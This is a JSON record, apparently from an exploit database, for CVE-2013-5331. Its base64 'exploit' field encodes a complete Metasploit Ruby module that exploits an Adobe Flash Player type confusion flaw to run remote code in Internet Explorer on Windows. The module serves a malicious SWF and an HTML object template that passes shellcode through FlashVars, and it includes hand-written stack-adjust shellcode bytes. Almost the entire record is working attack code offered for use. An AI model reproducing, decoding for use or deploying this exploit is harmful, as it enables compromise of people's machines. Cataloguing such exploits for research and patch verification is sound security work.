{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBOb3JtYWxSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6QnJvd3NlckV4cGxvaXRTZXJ2ZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgID0+ICJBZG9iZSBGbGFzaCBQbGF5ZXIgVHlwZSBDb25mdXNpb24gUmVtb3RlIENvZGUgRXhlY3V0aW9uIiwNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgdHlwZSBjb25mdXNpb24gdnVsbmVyYWJpbGl0eSBmb3VuZCBpbiB0aGUgQWN0aXZlWA0KICAgICAgICBjb21wb25lbnQgb2YgQWRvYmUgRmxhc2ggUGxheWVyLiBUaGlzIHZ1bG5lcmFiaWxpdHkgd2FzIGZvdW5kIGV4cGxvaXRlZA0KICAgICAgICBpbiB0aGUgd2lsZCBpbiBOb3ZlbWJlciAyMDEzLiBUaGlzIG1vZHVsZSBoYXMgYmVlbiB0ZXN0ZWQgc3VjY2Vzc2Z1bGx5DQogICAgICAgIG9uIElFIDYgdG8gSUUgMTAgd2l0aCBGbGFzaCAxMS43LCAxMS44IGFuZCAxMS45IHByaW9yIHRvIDExLjkuOTAwLjE3MA0KICAgICAgICBvdmVyIFdpbmRvd3MgWFAgU1AzIGFuZCBXaW5kb3dzIDcgU1AxLg0KICAgICAgfSwNCiAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnQXV0aG9yJyAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnVW5rbm93bicsICMgVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcnkgYW5kIGV4cGxvaXQgaW4gdGhlIHdpbGQNCiAgICAgICAgICAnYmFubmVkaXQnLCAjIEV4cGxvaXQgaW4gdGhlIHdpbGQgZGlzY292ZXJlciwgYW5hbHlzaXMgYW5kIHJlcG9ydGluZw0KICAgICAgICAgICdqdWFuIHZhenF1ZXonICMgbXNmIG1vZHVsZQ0KICAgICAgICBdLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWyAnQ1ZFJywgJzIwMTMtNTMzMScgXSwNCiAgICAgICAgICBbICdPU1ZEQicsICcxMDA3NzQnXSwNCiAgICAgICAgICBbICdCSUQnLCAnNjQxOTknXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL2hlbHB4LmFkb2JlLmNvbS9zZWN1cml0eS9wcm9kdWN0cy9mbGFzaC1wbGF5ZXIvYXBzYjEzLTI4Lmh0bWwnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9ibG9nLm1hbHdhcmV0cmFja2VyLmNvbS8yMDE0LzAxL2N2ZS0yMDEzLTUzMzEtZXZhZGVkLWF2LWJ5LXVzaW5nLmh0bWwnIF0NCiAgICAgICAgXSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdTcGFjZScgPT4gMjAwMCwNCiAgICAgICAgICAnRGlzYWJsZU5vcHMnID0+IHRydWUsDQogICAgICAgICAgJ1ByZXBlbmRFbmNvZGVyJyA9PiBzdGFja19hZGp1c3QNCiAgICAgICAgfSwNCiAgICAgICdEZWZhdWx0T3B0aW9ucycgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnSW5pdGlhbEF1dG9SdW5TY3JpcHQnID0+ICdtaWdyYXRlIC1mJywNCiAgICAgICAgICAnUmV0cmllcycgICAgICAgICAgICAgID0+IGZhbHNlLA0KICAgICAgICAgICdFWElURlVOQycgICAgICAgICAgICAgPT4gInRocmVhZCINCiAgICAgICAgfSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQogICAgICAnQnJvd3NlclJlcXVpcmVtZW50cycgPT4NCiAgICAgICAgew0KICAgICAgICAgIDpzb3VyY2UgID0+IC9zY3JpcHR8aGVhZGVycy9pLA0KICAgICAgICAgIDpjbHNpZCAgID0+ICJ7RDI3Q0RCNkUtQUU2RC0xMWNmLTk2QjgtNDQ0NTUzNTQwMDAwfSIsDQogICAgICAgICAgOm1ldGhvZCAgPT4gIkxvYWRNb3ZpZSIsDQogICAgICAgICAgOm9zX25hbWUgPT4gTXNmOjpPcGVyYXRpbmdTeXN0ZW1zOjpXSU5ET1dTLA0KICAgICAgICAgIDp1YV9uYW1lID0+IE1zZjo6SHR0cENsaWVudHM6OklFLA0KICAgICAgICAgIDpmbGFzaCAgID0+IGxhbWJkYSB7IHx2ZXJ8IHZlciA9fiAvXjExXC5bN3w4fDldLyAmJiB2ZXIgPCAnMTEuOS45MDAuMTcwJyB9DQogICAgICAgIH0sDQogICAgICAnVGFyZ2V0cycgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdBdXRvbWF0aWMnLCB7fSBdDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiRGVjIDEwIDIwMTMiLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBAc3dmID0gY3JlYXRlX3N3Zg0KICAgIHN1cGVyDQogIGVuZA0KDQogIGRlZiBzdGFja19hZGp1c3QNCiAgICBhZGp1c3QgPSAiXHg2NFx4YTFceDE4XHgwMFx4MDBceDAwIiAgIyBtb3YgZWF4LCBmczpbMHgxOCAjIGdldCB0ZWINCiAgICBhZGp1c3QgPDwgIlx4ODNceEMwXHgwOCIgICAgICAgICAgICAgIyBhZGQgZWF4LCBieXRlIDggIyBnZXQgcG9pbnRlciB0byBzdGFja2xpbWl0DQogICAgYWRqdXN0IDw8ICJceDhiXHgyMCIgICAgICAgICAgICAgICAgICMgbW92IGVzcCwgW2VheF0gIyBwdXQgZXNwIGF0IHN0YWNrbGltaXQNCiAgICBhZGp1c3QgPDwgIlx4ODFceEM0XHgzMFx4RjhceEZGXHhGRiIgIyBhZGQgZXNwLCAtMjAwMCAjIHBsdXMgYSBsaXR0bGUgb2Zmc2V0DQoNCiAgICBhZGp1c3QNCiAgZW5kDQoNCiAgZGVmIG9uX3JlcXVlc3RfZXhwbG9pdChjbGksIHJlcXVlc3QsIHRhcmdldF9pbmZvKQ0KICAgIHByaW50X3N0YXR1cygiUmVxdWVzdDogI3tyZXF1ZXN0LnVyaX0iKQ0KDQogICAgaWYgcmVxdWVzdC51cmkgPX4gL1wuc3dmJC8NCiAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBTV0YuLi4iKQ0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIEBzd2YsIHsnQ29udGVudC1UeXBlJz0+J2FwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoJywgJ1ByYWdtYScgPT4gJ25vLWNhY2hlJ30pDQogICAgICByZXR1cm4NCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBIVE1MLi4uIikNCiAgICB0YWcgPSByZXRyaWV2ZV90YWcoY2xpLCByZXF1ZXN0KQ0KICAgIHByb2ZpbGUgPSBnZXRfcHJvZmlsZSh0YWcpDQogICAgcHJvZmlsZVs6dHJpZWRdID0gZmFsc2UgdW5sZXNzIHByb2ZpbGUubmlsPyAjIHRvIGFsbG93IHJlcXVlc3QgdGhlIHN3Zg0KICAgIHByaW50X3N0YXR1cygic2hvd21lIHRoZSBtb25leSIpDQogICAgc2VuZF9leHBsb2l0X2h0bWwoY2xpLCBleHBsb2l0X3RlbXBsYXRlKGNsaSwgdGFyZ2V0X2luZm8pLCB7J1ByYWdtYScgPT4gJ25vLWNhY2hlJ30pDQogIGVuZA0KDQogIGRlZiBleHBsb2l0X3RlbXBsYXRlKGNsaSwgdGFyZ2V0X2luZm8pDQogICAgc3dmX3JhbmRvbSA9ICIje3JhbmRfdGV4dF9hbHBoYSg0ICsgcmFuZCgzKSl9LnN3ZiINCiAgICBmbGFzaF9wYXlsb2FkID0gIiINCiAgICBnZXRfcGF5bG9hZChjbGksdGFyZ2V0X2luZm8pLnVucGFjaygiVioiKS5lYWNoIGRvIHxpfA0KICAgICAgZmxhc2hfcGF5bG9hZCA8PCAiMHgje2kudG9fcygxNil9LCINCiAgICBlbmQNCiAgICBmbGFzaF9wYXlsb2FkLmdzdWIhKC8sJC8sICIiKQ0KDQoNCiAgICBodG1sX3RlbXBsYXRlID0gJVF8PGh0bWw+DQogICAgPGJvZHk+DQogICAgPG9iamVjdCBjbGFzc2lkPSJjbHNpZDpkMjdjZGI2ZS1hZTZkLTExY2YtOTZiOC00NDQ1NTM1NDAwMDAiIGNvZGViYXNlPSJodHRwOi8vZG93bmxvYWQubWFjcm9tZWRpYS5jb20vcHViL3Nob2Nrd2F2ZS9jYWJzL2ZsYXNoL3N3Zmxhc2guY2FiIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIiAvPg0KICAgIDxwYXJhbSBuYW1lPSJtb3ZpZSIgdmFsdWU9IjwlPXN3Zl9yYW5kb20lPiIgLz4NCiAgICA8cGFyYW0gbmFtZT0iYWxsb3dTY3JpcHRBY2Nlc3MiIHZhbHVlPSJhbHdheXMiIC8+DQogICAgPHBhcmFtIG5hbWU9IkZsYXNoVmFycyIgdmFsdWU9InNoPTwlPWZsYXNoX3BheWxvYWQlPiIgLz4NCiAgICA8cGFyYW0gbmFtZT0iUGxheSIgdmFsdWU9InRydWUiIC8+DQogICAgPC9vYmplY3Q+DQogICAgPC9ib2R5Pg0KICAgIDwvaHRtbD4NCiAgICB8DQoNCiAgICByZXR1cm4gaHRtbF90ZW1wbGF0ZSwgYmluZGluZygpDQogIGVuZA0KDQogIGRlZiBjcmVhdGVfc3dmDQogICAgcGF0aCA9IDo6RmlsZS5qb2luKCBNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImV4cGxvaXRzIiwgIkNWRS0yMDEzLTUzMzEiLCAiRXhwbG9pdC5zd2YiICkNCiAgICBzd2YgPSAgOjpGaWxlLm9wZW4ocGF0aCwgJ3JiJykgeyB8Znwgc3dmID0gZi5yZWFkIH0NCg0KICAgIHN3Zg0KICBlbmQNCg0KZW5k", 
    "filename": "platforms/windows/remote/33095.rb", 
    "id": "33095", 
    "cves": [
        "CVE-2013-5331"
    ]
}